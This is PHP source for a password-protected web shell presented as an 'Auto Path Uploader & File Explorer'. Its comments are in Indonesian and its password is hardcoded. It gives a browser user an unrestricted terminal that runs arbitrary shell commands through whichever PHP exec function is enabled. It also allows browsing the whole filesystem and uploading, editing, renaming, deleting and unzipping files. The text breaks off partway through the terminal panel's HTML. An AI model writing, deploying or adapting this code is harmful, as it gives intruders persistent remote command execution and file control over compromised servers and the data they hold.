<?php
$maxFileSize = 50 * 1024 * 1024;

$maxEditorFileSize = 2 * 1024 * 1024;

$blockedExtensions = ['pl'];

$hiddenDirs = [];

$authPassword = 'micaro777';

session_start();

$message = '';
$status = '';

function detectServerStartDir(): string {
    $candidates = [
        @getcwd(),
        __DIR__,
        $_SERVER['DOCUMENT_ROOT'] ?? null,
    ];

    foreach ($candidates as $cand) {
        if (!is_string($cand) || $cand === '') {
            continue;
        }
        $real = @realpath($cand);
        if ($real !== false && @is_dir($real)) {
            return $real;
        }
    }

    return '/';
}

function normalizeAbsPath(string $path, string $fallback = '/'): string {
    $trimmed = trim($path);
    if ($trimmed === '') {
        return $fallback;
    }

    $clean = preg_replace('#/+#', '/', $trimmed);
    if ($clean === '' || $clean[0] !== '/') {
        $clean = '/' . $clean;
    }

    $parts = [];
    foreach (explode('/', $clean) as $part) {
        if ($part === '' || $part === '.') {
            continue;
        }
        if ($part === '..') {
            array_pop($parts);
        } else {
            $parts[] = $part;
        }
    }

    return '/' . implode('/', $parts);
}

/**
 * Memeriksa apakah path diizinkan oleh open_basedir (jika aktif)
 */
function isAllowedByOpenBasedir(string $path): bool {
    $openBasedir = (string) ini_get('open_basedir');
    if ($openBasedir === '') {
        return true;
    }

    $allowedRoots = explode(PATH_SEPARATOR, $openBasedir);
    $normPath = rtrim(normalizeAbsPath($path), '/') ?: '/';

    foreach ($allowedRoots as $root) {
        $root = trim($root);
        if ($root === '') {
            continue;
        }
        $realRoot = @realpath($root) ?: rtrim(normalizeAbsPath($root), '/');
        $realRoot = $realRoot === '' ? '/' : $realRoot;

        if ($realRoot === '/') {
            return true;
        }

        if ($normPath === $realRoot || strpos($normPath . '/', $realRoot . '/') === 0) {
            return true;
        }
    }

    return false;
}

/**
 * Membersihkan nama file/folder agar aman dari traversal
 */
function sanitizeEntryName(string $name): string {
    $clean = basename(str_replace('\\', '/', trim($name)));
    $clean = str_replace("\0", '', $clean);
    if ($clean === '.' || $clean === '..') {
        return '';
    }
    return $clean;
}

/**
 * Mencoba membuat direktori secara rekursif jika belum ada
 */
function ensureDirectoryExists(string $absPath, ?string &$errorReason = null): ?string {
    $norm = normalizeAbsPath($absPath);

    if (!isAllowedByOpenBasedir($norm)) {
        $errorReason = 'Path diblokir oleh konfigurasi PHP open_basedir (' . ini_get('open_basedir') . ').';
        return null;
    }

    $existingReal = @realpath($norm);
    if ($existingReal !== false) {
        if (!@is_dir($existingReal)) {
            $errorReason = 'Path mengarah ke file biasa, bukan direktori.';
            return null;
        }
        return $existingReal;
    }

    $probe = $norm;
    while ($probe !== '/' && !@file_exists($probe)) {
        $probe = dirname($probe);
    }

    if (!isAllowedByOpenBasedir($probe)) {
        $errorReason = 'Direktori induk diblokir oleh open_basedir.';
        return null;
    }

    if (!@is_writable($probe)) {
        $errorReason = 'Tidak punya izin tulis (write) pada direktori induk: ' . $probe;
        return null;
    }

    if (!@mkdir($norm, 0755, true)) {
        $lastErr = error_get_last();
        $errorReason = $lastErr['message'] ?? 'Gagal membuat direktori baru.';
        return null;
    }

    $createdReal = @realpath($norm);
    return $createdReal !== false ? $createdReal : $norm;
}

/**
 * Memvalidasi path direktori yang sudah ada
 */
function resolveExistingDir(string $absPath): ?string {
    $norm = normalizeAbsPath($absPath);
    if (!isAllowedByOpenBasedir($norm)) {
        return null;
    }
    $real = @realpath($norm);
    if ($real === false || !@is_dir($real)) {
        return null;
    }
    return $real;
}

/**
 * Format ukuran file
 */
function formatFileSize(int $bytes): string {
    if ($bytes < 1024) return $bytes . ' B';
    if ($bytes < 1048576) return round($bytes / 1024, 1) . ' KB';
    if ($bytes < 1073741824) return round($bytes / 1048576, 1) . ' MB';
    return round($bytes / 1073741824, 2) . ' GB';
}

/**
 * Memeriksa apakah fungsi eksekusi shell tersedia dan tidak masuk disable_functions
 */
function getAvailableExecMethod(): ?string {
    $disabledRaw = (string) ini_get('disable_functions');
    $disabled = array_map('trim', explode(',', strtolower($disabledRaw)));

    $candidates = ['proc_open', 'shell_exec', 'exec', 'passthru', 'system'];
    foreach ($candidates as $fn) {
        if (!in_array($fn, $disabled, true) && function_exists($fn)) {
            return $fn;
        }
    }

    return null;
}

/**
 * Menjalankan perintah shell langsung tanpa pembatasan di sisi skrip
 */
function runTerminalCommand(string $command, string $cwd, ?string &$usedMethod = null): array {
    $method = getAvailableExecMethod();
    $usedMethod = $method;

    if ($method === null) {
        return [
            'ok'     => false,
            'output' => "Semua fungsi eksekusi shell (proc_open, shell_exec, exec, passthru, system) dinonaktifkan oleh server.",
            'code'   => 1,
        ];
    }

    $safeCwd = resolveExistingDir($cwd) ?? detectServerStartDir();
    $fullCmd = 'cd ' . escapeshellarg($safeCwd) . ' && ' . $command . ' 2>&1';

    if ($method === 'proc_open') {
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w'],
        ];
        $process = @proc_open($command, $descriptors, $pipes, $safeCwd);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $stdout = (string) stream_get_contents($pipes[1]);
            $stderr = (string) stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            $exitCode = proc_close($process);
            $combined = trim($stdout . ($stderr !== '' ? "\n" . $stderr : ''));
            return [
                'ok'     => ($exitCode === 0),
                'output' => $combined !== '' ? $combined : "(Perintah selesai dengan exit code {$exitCode}, tanpa output)",
                'code'   => $exitCode,
            ];
        }
    }

    if ($method === 'shell_exec') {
        $out = @shell_exec($fullCmd);
        return [
            'ok'     => ($out !== null),
            'output' => $out !== null && trim($out) !== '' ? rtrim($out) : '(Tidak ada output)',
            'code'   => $out !== null ? 0 : 1,
        ];
    }

    if ($method === 'exec') {
        $lines = [];
        $code = 0;
        @exec($fullCmd, $lines, $code);
        $text = implode("\n", $lines);
        return [
            'ok'     => ($code === 0),
            'output' => $text !== '' ? $text : "(Exit code {$code}, tanpa output)",
            'code'   => $code,
        ];
    }

    // passthru atau system
    ob_start();
    $code = 0;
    if ($method === 'passthru') {
        @passthru($fullCmd, $code);
    } else {
        @system($fullCmd, $code);
    }
    $captured = (string) ob_get_clean();

    return [
        'ok'     => ($code === 0),
        'output' => trim($captured) !== '' ? rtrim($captured) : "(Exit code {$code}, tanpa output)",
        'code'   => $code,
    ];
}

/**
 * Mengambil daftar folder dan file di dalam direktori aktif
 */
function listDirectoryEntries(string $dirAbs, array $hiddenDirs): array {
    if (!isAllowedByOpenBasedir($dirAbs)) {
        return ['folders' => [], 'files' => []];
    }

    $items = @scandir($dirAbs);
    if ($items === false) {
        return ['folders' => [], 'files' => []];
    }

    $folders = [];
    $files = [];

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue;
        }
        if ($dirAbs === '/' && in_array($item, $hiddenDirs, true)) {
            continue;
        }

        $fullPath = ($dirAbs === '/') ? '/' . $item : $dirAbs . '/' . $item;
        if (!isAllowedByOpenBasedir($fullPath)) {
            continue;
        }

        if (@is_dir($fullPath) && !@is_link($fullPath)) {
            $folders[] = [
                'name'     => $item,
                'abs_path' => $fullPath,
                'readable' => @is_readable($fullPath),
                'writable' => @is_writable($fullPath),
            ];
        } elseif (@is_file($fullPath)) {
            $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
            $files[] = [
                'name'     => $item,
                'abs_path' => $fullPath,
                'ext'      => $ext,
                'size'     => (int) @filesize($fullPath),
                'readable' => @is_readable($fullPath),
                'writable' => @is_writable($fullPath),
                'is_zip'   => ($ext === 'zip'),
            ];
        }
    }

    usort($folders, static fn(array $a, array $b): int => strcasecmp($a['name'], $b['name']));
    usort($files, static fn(array $a, array $b): int => strcasecmp($a['name'], $b['name']));

    return ['folders' => $folders, 'files' => $files];
}

/**
 * Memindahkan file upload dengan fallback jika move_uploaded_file gagal
 */
function storeUploadedFile(string $tmpName, string $destination, string &$errDetail = ''): bool {
    if (!is_uploaded_file($tmpName)) {
        $errDetail = 'File sementara bukan hasil upload HTTP yang valid.';
        return false;
    }

    if (@move_uploaded_file($tmpName, $destination)) {
        @chmod($destination, 0644);
        return true;
    }

    if (@copy($tmpName, $destination)) {
        @unlink($tmpName);
        @chmod($destination, 0644);
        return true;
    }

    $lastErr = error_get_last();
    $errDetail = $lastErr['message'] ?? 'Akses ditolak oleh permission/ownership sistem file atau mount read-only.';
    return false;
}

/**
 * Ekstrak file ZIP ke direktori tujuan dengan perlindungan Zip Slip
 */
function extractZipSafely(string $zipPath, string $destDir, string &$errorMsg = ''): bool {
    if (!class_exists('ZipArchive')) {
        $errorMsg = 'Ekstensi PHP ZipArchive tidak aktif di server ini.';
        return false;
    }

    $zip = new ZipArchive();
    if ($zip->open($zipPath) !== true) {
        $errorMsg = 'Gagal membuka file ZIP.';
        return false;
    }

    $realDest = realpath($destDir);
    if ($realDest === false || !is_dir($realDest)) {
        $zip->close();
        $errorMsg = 'Direktori tujuan ekstrak tidak valid.';
        return false;
    }

    $realDestSlash = rtrim($realDest, '/') . '/';

    for ($i = 0; $i < $zip->numFiles; $i++) {
        $entryName = $zip->getNameIndex($i);
        if ($entryName === false) {
            continue;
        }

        $normEntry = str_replace('\\', '/', $entryName);
        if (strpos($normEntry, '../') !== false || strpos($normEntry, '..\\') !== false || $normEntry[0] === '/') {
            $zip->close();
            $errorMsg = 'Arsip mengandung path berbahaya (Zip Slip) dan dibatalkan.';
            return false;
        }

        $targetEntryPath = $realDestSlash . ltrim($normEntry, '/');
        $targetDirCheck = (substr($normEntry, -1) === '/') ? $targetEntryPath : dirname($targetEntryPath);

        if (!isAllowedByOpenBasedir($targetDirCheck)) {
            $zip->close();
            $errorMsg = 'Target ekstrak diblokir oleh open_basedir.';
            return false;
        }
    }

    $ok = $zip->extractTo($realDest);
    $zip->close();

    if (!$ok) {
        $errorMsg = 'Gagal mengekstrak isi ZIP. Periksa izin tulis folder.';
        return false;
    }

    return true;
}

// Proses login
if (isset($_POST['login'])) {
    if (hash_equals($authPassword, $_POST['password'] ?? '')) {
        $_SESSION['logged_in'] = true;
    } else {
        $status = 'error';
        $message = 'Password salah.';
    }
}

// Proses logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

$autoStartDir = detectServerStartDir();
$runtimeUser = function_exists('get_current_user') ? get_current_user() : 'unknown';
$posixUser = function_exists('posix_getpwuid') && function_exists('posix_geteuid')
    ? (@posix_getpwuid(@posix_geteuid())['name'] ?? $runtimeUser)
    : $runtimeUser;

if (!isset($_SESSION['term_history']) || !is_array($_SESSION['term_history'])) {
    $_SESSION['term_history'] = [];
}

$terminalOutput = '';
$terminalLastCmd = '';
$terminalExitCode = null;
$terminalMethodUsed = getAvailableExecMethod();

// Tentukan direktori browse & target
if (isset($_SESSION['logged_in']) && isset($_POST['jump_path'])) {
    $rawJump = (string) ($_POST['custom_path'] ?? '');
    $dirErr = null;
    $createdOrFound = ensureDirectoryExists($rawJump, $dirErr);

    if ($createdOrFound !== null) {
        $browseAbs = $createdOrFound;
        $targetAbs = $createdOrFound;
        if (!@file_exists(normalizeAbsPath($rawJump))) {
            $status = 'success';
            $message = 'Direktori baru berhasil dibuat dan dibuka: <strong>' . htmlspecialchars($createdOrFound) . '</strong>';
        }
    } else {
        $browseAbs = resolveExistingDir($_POST['browse_dir'] ?? $autoStartDir) ?? $autoStartDir;
        $targetAbs = normalizeAbsPath($rawJump, $browseAbs);
        $status = 'error';
        $message = 'Tidak dapat membuka/membuat path <strong>' . htmlspecialchars(normalizeAbsPath($rawJump)) . '</strong>. ' . htmlspecialchars($dirErr ?? '');
    }
} else {
    $requestedBrowse = $_GET['dir'] ?? ($_POST['browse_dir'] ?? $autoStartDir);
    $browseAbs = resolveExistingDir($requestedBrowse) ?? $autoStartDir;

    $requestedTarget = $_POST['target_path'] ?? ($_GET['target'] ?? $browseAbs);
    $targetAbs = resolveExistingDir($requestedTarget) ?? normalizeAbsPath($requestedTarget, $browseAbs);
}

// Proses aksi manajemen file, folder & terminal pada direktori aktif ($browseAbs)
if (isset($_SESSION['logged_in']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    // 0. Eksekusi Terminal Command tanpa pembatasan khusus dari sisi skrip
    if (isset($_POST['run_cmd'])) {
        $rawCmd = (string) ($_POST['terminal_cmd'] ?? '');
        $terminalLastCmd = $rawCmd;

        if (trim($rawCmd) === '') {
            $status = 'error';
            $message = 'Perintah terminal tidak boleh kosong.';
        } else {
            $_SESSION['term_history'][] = $rawCmd;

            $usedFn = null;
            $res = runTerminalCommand($rawCmd, $browseAbs, $usedFn);
            $terminalMethodUsed = $usedFn;
            $terminalExitCode = $res['code'];
            $terminalOutput = $res['output'];
        }
    }

    // Hapus riwayat terminal jika tombol ditekan
    if (isset($_POST['clear_history'])) {
        $_SESSION['term_history'] = [];
    }

    // 1. Buat folder baru
    if (isset($_POST['create_folder'])) {
        $folderName = sanitizeEntryName((string) ($_POST['new_folder_name'] ?? ''));
        if ($folderName === '') {
            $status = 'error';
            $message = 'Nama folder tidak valid.';
        } else {
            $newFolderPath = rtrim($browseAbs, '/') . '/' . $folderName;
            if (@file_exists($newFolderPath)) {
                $status = 'error';
                $message = 'Folder atau item bernama <strong>' . htmlspecialchars($folderName) . '</strong> sudah ada.';
            } elseif (!@is_writable($browseAbs)) {
                $status = 'error';
                $message = 'Folder aktif tidak memiliki izin tulis untuk membuat folder baru.';
            } elseif (@mkdir($newFolderPath, 0755)) {
                $status = 'success';
                $message = 'Folder baru berhasil dibuat: <strong>' . htmlspecialchars($newFolderPath) . '</strong>';
            } else {
                $status = 'error';
                $message = 'Gagal membuat folder baru.';
            }
        }
    }

    // 2. Buat file baru
    if (isset($_POST['create_file'])) {
        $fileName = sanitizeEntryName((string) ($_POST['new_file_name'] ?? ''));
        $ext = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
        if ($fileName === '') {
            $status = 'error';
            $message = 'Nama file tidak valid.';
        } elseif (in_array($ext, $blockedExtensions, true)) {
            $status = 'error';
            $message = 'Ekstensi file .' . htmlspecialchars($ext) . ' diblokir.';
        } else {
            $newFilePath = rtrim($browseAbs, '/') . '/' . $fileName;
            if (@file_exists($newFilePath)) {
                $status = 'error';
                $message = 'File bernama <strong>' . htmlspecialchars($fileName) . '</strong> sudah ada.';
            } elseif (!@is_writable($browseAbs)) {
                $status = 'error';
                $message = 'Folder aktif tidak memiliki izin tulis untuk membuat file baru.';
            } elseif (@file_put_contents($newFilePath, '') !== false) {
                @chmod($newFilePath, 0644);
                $status = 'success';
                $message = 'File baru berhasil dibuat: <strong>' . htmlspecialchars($newFilePath) . '</strong>';
            } else {
                $status = 'error';
                $message = 'Gagal membuat file baru.';
            }
        }
    }

    // 3. Rename file atau folder
    if (isset($_POST['rename_item'])) {
        $oldName = sanitizeEntryName((string) ($_POST['old_name'] ?? ''));
        $newName = sanitizeEntryName((string) ($_POST['new_name'] ?? ''));
        $newExt = strtolower(pathinfo($newName, PATHINFO_EXTENSION));

        $oldFull = rtrim($browseAbs, '/') . '/' . $oldName;
        $newFull = rtrim($browseAbs, '/') . '/' . $newName;

        if ($oldName === '' || $newName === '') {
            $status = 'error';
            $message = 'Nama lama atau nama baru tidak valid.';
        } elseif (!@file_exists($oldFull)) {
            $status = 'error';
            $message = 'Item yang ingin di-rename tidak ditemukan.';
        } elseif (@is_file($oldFull) && in_array($newExt, $blockedExtensions, true)) {
            $status = 'error';
            $message = 'Ekstensi tujuan .' . htmlspecialchars($newExt) . ' diblokir.';
        } elseif (@file_exists($newFull)) {
            $status = 'error';
            $message = 'Nama tujuan <strong>' . htmlspecialchars($newName) . '</strong> sudah digunakan.';
        } elseif (@rename($oldFull, $newFull)) {
            $status = 'success';
            $message = 'Berhasil rename <strong>' . htmlspecialchars($oldName) . '</strong> menjadi <strong>' . htmlspecialchars($newName) . '</strong>.';
        } else {
            $status = 'error';
            $message = 'Gagal me-rename item. Periksa izin direktori.';
        }
    }

    // 4. Simpan hasil edit semua jenis file
    if (isset($_POST['save_edit'])) {
        $editTargetName = sanitizeEntryName((string) ($_POST['edit_filename'] ?? ''));
        $editFull = rtrim($browseAbs, '/') . '/' . $editTargetName;
        $realBrowse = @realpath($browseAbs);
        $realEdit = @realpath($editFull);

        if (
            $editTargetName === '' ||
            $realBrowse === false ||
            $realEdit === false ||
            !isAllowedByOpenBasedir($realEdit) ||
            dirname($realEdit) !== $realBrowse ||
            !@is_file($realEdit) ||
            @is_link($editFull)
        ) {
            $status = 'error';
            $message = 'File yang diedit tidak valid atau tidak ditemukan.';
        } elseif (!@is_writable($realEdit)) {
            $status = 'error';
            $message = 'File tidak memiliki izin tulis (read-only).';
        } else {
            $content = (string) ($_POST['file_content'] ?? '');
            if (@file_put_contents($realEdit, $content) !== false) {
                $status = 'success';
                $message = 'Perubahan pada file <strong>' . htmlspecialchars($editTargetName) . '</strong> berhasil disimpan.';
            } else {
                $lastErr = error_get_last();
                $status = 'error';
                $message = 'Gagal menyimpan perubahan file. ' . htmlspecialchars($lastErr['message'] ?? '');
            }
        }
    }

    // 5. Unzip file .zip di folder aktif
    if (isset($_POST['unzip_file'])) {
        $zipName = sanitizeEntryName((string) ($_POST['zip_filename'] ?? ''));
        $zipFull = rtrim($browseAbs, '/') . '/' . $zipName;

        if ($zipName === '' || !@is_file($zipFull) || strtolower(pathinfo($zipName, PATHINFO_EXTENSION)) !== 'zip') {
            $status = 'error';
            $message = 'File ZIP tidak valid atau tidak ditemukan.';
        } else {
            $zipErr = '';
            if (extractZipSafely($zipFull, $browseAbs, $zipErr)) {
                $status = 'success';
                $message = 'File ZIP <strong>' . htmlspecialchars($zipName) . '</strong> berhasil diekstrak ke <strong>' . htmlspecialchars($browseAbs) . '</strong>.';
            } else {
                $status = 'error';
                $message = 'Gagal unzip <strong>' . htmlspecialchars($zipName) . '</strong>: ' . htmlspecialchars($zipErr);
            }
        }
    }

    // 6. Hapus file di folder aktif
    if (isset($_POST['delete_file'])) {
        $delName = sanitizeEntryName((string) ($_POST['delete_filename'] ?? ''));
        $delFull = rtrim($browseAbs, '/') . '/' . $delName;
        $realBrowse = @realpath($browseAbs);
        $realDel = @realpath($delFull);

        if ($delName === '' || $realBrowse === false || $realDel === false || !isAllowedByOpenBasedir($realDel)) {
            $status = 'error';
            $message = 'File tidak valid atau tidak diizinkan untuk dihapus.';
        } elseif (dirname($realDel) !== $realBrowse || !@is_file($realDel) || @is_link($delFull)) {
            $status = 'error';
            $message = 'Target bukan file biasa yang valid di folder aktif.';
        } elseif (@unlink($realDel)) {
            $status = 'success';
            $message = 'File <strong>' . htmlspecialchars($delName) . '</strong> berhasil dihapus.';
        } else {
            $lastErr = error_get_last();
            $status = 'error';
            $message = 'Gagal menghapus file <strong>' . htmlspecialchars($delName) . '</strong>. ' . htmlspecialchars($lastErr['message'] ?? 'Periksa izin file/folder.');
        }
    }

    // 7. Proses upload file
    if (isset($_FILES['file'])) {
        $file = $_FILES['file'];
        $dirErr = null;
        $readyTarget = ensureDirectoryExists($targetAbs, $dirErr);

        if ($readyTarget === null) {
            $status = 'error';
            $message = 'Folder tujuan tidak tersedia/tidak dapat dibuat: <strong>' . htmlspecialchars($targetAbs) . '</strong>. ' . htmlspecialchars($dirErr ?? '');
        } elseif ($file['error'] !== UPLOAD_ERR_OK) {
            $status = 'error';
            $message = 'Gagal mengunggah file (Kode error PHP: ' . (int) $file['error'] . ').';
        } elseif ($file['size'] > $maxFileSize) {
            $status = 'error';
            $message = 'Ukuran file melebihi batas maksimal skrip.';
        } else {
            $originalName = basename($file['name']);
            $safeName = preg_replace('/[^a-zA-Z0-9._-]/', '_', $originalName);
            $ext = strtolower(pathinfo($safeName, PATHINFO_EXTENSION));

            if (in_array($ext, $blockedExtensions, true)) {
                $status = 'error';
                $message = 'Ekstensi file .' . htmlspecialchars($ext) . ' diblokir demi keamanan.';
            } else {
                $destination = rtrim($readyTarget, '/') . '/' . $safeName;
                if (file_exists($destination)) {
                    $nameWithoutExt = pathinfo($safeName, PATHINFO_FILENAME);
                    $safeName = $nameWithoutExt . '_' . date('Ymd_His') . ($ext ? '.' . $ext : '');
                    $destination = rtrim($readyTarget, '/') . '/' . $safeName;
                }

                $transferErr = '';
                if (storeUploadedFile($file['tmp_name'], $destination, $transferErr)) {
                    $targetAbs = $readyTarget;
                    $status = 'success';
                    $message = 'File berhasil diunggah ke: <strong>' . htmlspecialchars($destination) . '</strong>';
                } else {
                    $status = 'error';
                    $message = 'Gagal memindahkan file ke <strong>' . htmlspecialchars($destination) . '</strong>. Detail: <code>' . htmlspecialchars($transferErr) . '</code>';
                }
            }
        }
    }
}

// Cek mode edit/lihat file jika diminta lewat GET
$viewFileName = '';
$viewFileContent = null;
$viewIsEditable = false;

if (isset($_SESSION['logged_in']) && isset($_GET['view'])) {
    $reqView = sanitizeEntryName((string) $_GET['view']);
    $fullViewPath = rtrim($browseAbs, '/') . '/' . $reqView;
    $realBrowse = @realpath($browseAbs);
    $realView = @realpath($fullViewPath);

    if (
        $reqView !== '' &&
        $realBrowse !== false &&
        $realView !== false &&
        isAllowedByOpenBasedir($realView) &&
        dirname($realView) === $realBrowse &&
        @is_file($realView) &&
        !@is_link($fullViewPath) &&
        @is_readable($realView)
    ) {
        $viewFileName = $reqView;
        $viewIsEditable = @is_writable($realView);
        $fsize = (int) @filesize($realView);
        if ($fsize <= $maxEditorFileSize) {
            $rawContent = @file_get_contents($realView);
            if ($rawContent !== false) {
                $viewFileContent = $rawContent;
            }
        } else {
            $status = 'error';
            $message = 'File terlalu besar untuk dibuka langsung di editor (maksimal 2MB).';
        }
    } else {
        $status = 'error';
        $message = 'File tidak dapat dibuka atau tidak ditemukan.';
    }
}

$entries = isset($_SESSION['logged_in']) ? listDirectoryEntries($browseAbs, $hiddenDirs) : ['folders' => [], 'files' => []];
$subfolders = $entries['folders'];
$filesList = $entries['files'];

// Breadcrumb navigasi absolut
$breadcrumbs = [['label' => '/', 'path' => '/']];
if ($browseAbs !== '/') {
    $acc = '';
    foreach (explode('/', ltrim($browseAbs, '/')) as $seg) {
        if ($seg === '') {
            continue;
        }
        $acc .= '/' . $seg;
        $breadcrumbs[] = ['label' => $seg, 'path' => $acc];
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Path Uploader & File Explorer</title>
    <style>
        * { box-sizing: border-box; font-family: system-ui, -apple-system, sans-serif; }
        body {
            background: #0f172a;
            color: #e2e8f0;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            margin: 0;
            padding: 24px 16px;
        }
        .card {
            background: #1e293b;
            border: 1px solid #334155;
            border-radius: 12px;
            padding: 24px;
            width: 100%;
            max-width: 860px;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.4);
        }
        h2 { margin: 0 0 6px; font-size: 1.3rem; color: #f8fafc; }
        h3 { margin: 0 0 10px; font-size: 1rem; color: #f8fafc; }
        .sub { margin: 0 0 18px; font-size: 0.83rem; color: #94a3b8; word-break: break-all; line-height: 1.5; }
        label { display: block; font-size: 0.85rem; color: #cbd5e1; margin-bottom: 6px; }
        input[type="password"], input[type="file"], input[type="text"], textarea {
            width: 100%;
            padding: 10px 12px;
            border-radius: 8px;
            border: 1px solid #475569;
            background: #0f172a;
            color: #f8fafc;
            margin-bottom: 14px;
        }
        textarea.editor-box {
            min-height: 280px;
            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
            font-size: 0.82rem;
            line-height: 1.45;
            resize: vertical;
        }
        button, .btn {
            padding: 10px 14px;
            border: none;
            border-radius: 8px;
            background: #3b82f6;
            color: #fff;
            font-weight: 600;
            font-size: 0.875rem;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
            transition: background 0.15s;
        }
        button:hover, .btn:hover { background: #2563eb; }
        .btn-secondary {
            background: #334155;
            color: #e2e8f0;
            padding: 7px 11px;
            font-size: 0.78rem;
        }
        .btn-secondary:hover { background: #475569; }
        .btn-select {
            background: #0ea5e9;
            padding: 6px 10px;
            font-size: 0.78rem;
        }
        .btn-select:hover { background: #0284c7; }
        .btn-zip {
            background: #16a34a;
            padding: 6px 10px;
            font-size: 0.78rem;
        }
        .btn-zip:hover { background: #15803d; }
        .btn-danger {
            background: #dc2626;
            color: #fff;
            padding: 6px 10px;
            font-size: 0.78rem;
        }
        .btn-danger:hover { background: #b91c1c; }
        .alert {
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 16px;
            font-size: 0.85rem;
            word-break: break-all;
            line-height: 1.45;
        }
        .alert.success { background: rgba(34, 197, 94, 0.15); border: 1px solid #22c55e; color: #86efac; }
        .alert.error { background: rgba(239, 68, 68, 0.15); border: 1px solid #ef4444; color: #fca5a5; }
        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
        .logout { font-size: 0.8rem; color: #94a3b8; text-decoration: none; }
        .logout:hover { color: #f8fafc; }
        .explorer {
            background: #0f172a;
            border: 1px solid #334155;
            border-radius: 10px;
            padding: 12px;
            margin-bottom: 16px;
        }
        .breadcrumb {
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
            align-items: center;
            font-size: 0.82rem;
            margin-bottom: 10px;
            padding-bottom: 8px;
            border-bottom: 1px solid #1e293b;
        }
        .breadcrumb a { color: #60a5fa; text-decoration: none; }
        .breadcrumb a:hover { text-decoration: underline; }
        .create-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 10px;
            margin-bottom: 12px;
            padding-bottom: 12px;
            border-bottom: 1px solid #1e293b;
        }
        .inline-form { display: flex; gap: 6px; align-items: center; }
        .inline-form input { margin-bottom: 0; flex: 1; padding: 7px 10px; font-size: 0.82rem; }
        .entry-list {
            max-height: 280px;
            overflow-y: auto;
        }
        .entry-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 6px;
            border-bottom: 1px solid #1e293b;
            gap: 8px;
        }
        .entry-row:last-child { border-bottom: none; }
        .entry-name {
            font-size: 0.85rem;
            color: #f1f5f9;
            word-break: break-all;
        }
        .entry-meta { font-size: 0.75rem; color: #94a3b8; margin-left: 6px; }
        .entry-actions { display: flex; gap: 6px; flex-shrink: 0; flex-wrap: wrap; }
        .empty { font-size: 0.85rem; color: #64748b; padding: 12px 6px; }
        .path-row {
            display: flex;
            gap: 8px;
            align-items: center;
            margin-bottom: 14px;
        }
        .path-row input { margin-bottom: 0; flex: 1; }
        .viewer-panel {
            background: #0f172a;
            border: 1px solid #475569;
            border-radius: 10px;
            padding: 14px;
            margin-bottom: 16px;
        }
        .viewer-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
            gap: 10px;
        }
        .terminal-box {
            background: #020617;
            border: 1px solid #334155;
            border-radius: 10px;
            padding: 14px;
            margin-bottom: 16px;
        }
        .terminal-top {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 8px;
            margin-bottom: 10px;
        }
        .terminal-badge {
            font-size: 0.74rem;
            padding: 3px 8px;
            border-radius: 999px;
            background: #1e293b;
            color: #93c5fd;
            border: 1px solid #334155;
        }
        .terminal-output {
            background: #090d16;
            border: 1px solid #1e293b;
            border-radius: 8px;
            padding: 12px;
            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
            font-size: 0.8rem;
            line-height: 1.5;
            color: #cbd5e1;
            max-height: 360px;
            overflow: auto;
            white-space: pre-wrap;
            word-break: break-word;
            margin-bottom: 10px;
        }
        .terminal-prompt-line {
            color: #4ade80;
            margin-bottom: 6px;
            font-weight: 600;
        }
        .terminal-code-err {
            color: #f87171;
            font-size: 0.75rem;
            margin-top: 6px;
        }
        .quick-cmds {
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
            margin-bottom: 10px;
            max-height: 120px;
            overflow-y: auto;
        }
        .quick-cmds button {
            padding: 5px 9px;
            font-size: 0.74rem;
            background: #1e293b;
            color: #cbd5e1;
            border: 1px solid #334155;
        }
        .quick-cmds button:hover {
            background: #334155;
            color: #fff;
        }
    </style>
</head>
<body>
<div class="card">
    <?php if (!isset($_SESSION['logged_in'])): ?>
        <h2>Login Uploader</h2>
        <p class="sub">Masukkan password untuk mengakses uploader.</p>
        <?php if ($message): ?>
            <div class="alert <?= $status ?>"><?= $message ?></div>
        <?php endif; ?>
        <form method="POST">
            <input type="password" name="password" placeholder="Password" required autofocus>
            <button type="submit" name="login">Masuk</button>
        </form>
    <?php else: ?>
        <div class="top-bar">
            <h2>Auto Path Server Uploader</h2>
            <a class="logout" href="?logout=1">Logout</a>
        </div>
        <p class="sub">
            Auto path: <code><?= htmlspecialchars($autoStartDir) ?></code> |
            PHP user: <code><?= htmlspecialchars($posixUser) ?></code> |
            Exec engine: <code><?= htmlspecialchars($terminalMethodUsed ?? 'none') ?></code><br>
            Folder aktif: <code><?= htmlspecialchars($browseAbs) ?></code>
        </p>

        <?php if ($message): ?>
            <div class="alert <?= $status ?>"><?= $message ?></div>
        <?php endif; ?>

        <div class="terminal-box">
            <div class="terminal-top">
                <h3 style="margin:0;">Terminal Command</h3>
                <div style="display:flex;gap:6px;align-items:center;">
                    <span class="terminal-badge">CWD: <?= htmlspecialchars($browseAbs) ?></span>
                    <?php if (!empty($_SESSION['term_history'])): ?>
                        <form method="POST" style="margin:0;">
                            <input type="hidden" name="browse_dir" value="<?= htmlspecialchars($browseAbs) ?>">
                            <input type="hidden" name="target_path" value="<?= htmlspecialchars($targetAbs) ?>">
                            <button type="submit" name="clear_history" class="btn-secondary" style="padding:3px 8px;font-size:0.72rem;">Hapus Riwayat</button>
                        </form>
